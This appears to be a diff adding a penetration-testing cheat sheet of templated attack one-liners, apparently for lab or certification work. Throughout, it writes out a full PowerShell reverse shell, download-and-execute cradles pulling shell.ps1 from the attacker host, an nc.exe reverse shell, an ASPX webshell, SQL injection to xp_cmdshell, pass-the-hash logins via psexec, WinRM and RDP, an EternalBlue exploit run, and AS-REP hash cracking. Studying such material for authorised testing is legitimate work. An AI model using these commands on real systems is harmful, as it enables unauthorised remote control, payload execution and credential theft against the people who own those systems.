@@ -1,0 +1,59 @@
+# === REVERSE SHELL ONE-LINERS ===
+# Kali listener first
+rlwrap nc -nvlp {{KALI_PORT}}
+# PowerShell TCP reverse shell
+powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('{{KALI}}',{{KALI_PORT}});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+# PowerShell download and exec
+powershell -nop -c "IEX(New-Object Net.WebClient).DownloadString('http://{{KALI}}:{{KALI_PORT}}/shell.ps1')"
+
+# === SHELL UPGRADE ===
+# Upgrade cmd to PowerShell
+powershell -ep bypass
+powershell -NoProfile -ExecutionPolicy Bypass
+# Spawn reverse shell from existing limited shell
+powershell -c "Start-Process -NoNewWindow -FilePath 'C:\Windows\Temp\nc.exe' -ArgumentList '{{KALI}} {{KALI_PORT}} -e cmd'"
+
+# === CREDENTIAL REUSE (try immediately with any found creds) ===
+# SMB / PsExec
+impacket-psexec {{DOMAIN}}/{{USER}}:{{PASS}}@{{TARGET}}
+impacket-psexec {{DOMAIN}}/{{USER}}@{{TARGET}} -hashes :{{NTLM_HASH}}
+impacket-wmiexec {{DOMAIN}}/{{USER}}:{{PASS}}@{{TARGET}}
+crackmapexec smb {{TARGET}} -u {{USER}} -p {{PASS}} -x "whoami"
+
+# === RDP: CREDENTIAL REUSE (port 3389) ===
+xfreerdp3 /cert-ignore /u:{{USER}} /p:{{PASS}} /v:{{TARGET}}
+xfreerdp3 /cert-ignore /u:{{USER}} /d:{{DOMAIN}} /p:{{PASS}} /v:{{TARGET}} /drive:share,/home/kali/share
+# Pass the hash via RDP
+xfreerdp3 /cert-ignore /u:{{USER}} /d:{{DOMAIN}} /pth:{{NTLM_HASH}} /v:{{TARGET}}
+
+# === WINRM: CREDENTIAL REUSE (ports 5985/5986) ===
+evil-winrm -I {{TARGET}} -u {{USER}} -p {{PASS}}
+evil-winrm -I {{TARGET}} -u {{USER}} -H {{NTLM_HASH}}
+crackmapexec winrm {{TARGET}} -u {{USER}} -p {{PASS}}
+
+# === WEB: WEBSHELL DELIVERY (ports 80/443/8080/8443) ===
+# ASPX webshell (IIS targets)
+echo '<%@ Page Language="C#" %><% System.Diagnostics.Process.Start("cmd.exe","/c powershell IEX(New-Object Net.WebClient).DownloadString(\"http://{{KALI}}:{{KALI_PORT}}/shell.ps1\")"); %>' > shell.aspx
+# Trigger webshell
+curl "http://{{TARGET}}/shell.aspx"
+curl "http://{{TARGET}}/shell.php?cmd=whoami"
+
+# === WEB: SQLI TO SHELL (ports 80/443/8080/8443) ===
+# MSSQL - xp_cmdshell
+EXEC xp_cmdshell 'powershell IEX(New-Object Net.WebClient).DownloadString("http://{{KALI}}:{{KALI_PORT}}/shell.ps1")';
+
+# === MSSQL: CODE EXECUTION (port 1433) ===
+impacket-mssqlclient {{DOMAIN}}/{{USER}}:{{PASS}}@{{TARGET}} -windows-auth
+EXEC SP_CONFIGURE 'show advanced options', 1; RECONFIGURE;
+EXEC SP_CONFIGURE 'xp_cmdshell', 1; RECONFIGURE;
+EXEC xp_cmdshell 'whoami';
+EXEC xp_cmdshell 'powershell IEX(New-Object Net.WebClient).DownloadString("http://{{KALI}}:{{KALI_PORT}}/shell.ps1")';
+
+# === SMB: ETERNALBLUE MS17-010 (ports 139/445) ===
+nmap -sV -p 445 --script smb-vuln-ms17-010 {{TARGET}}
+python3 eternal_target_2.py {{TARGET}}
+
+# === KERBEROS: PRE-AUTH ATTACKS (port 88) ===
+impacket-GetNPUsers -dc-ip {{TARGET}} -request -usersfile users.txt {{DOMAIN}}
+hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
+# Use cracked password to authenticate
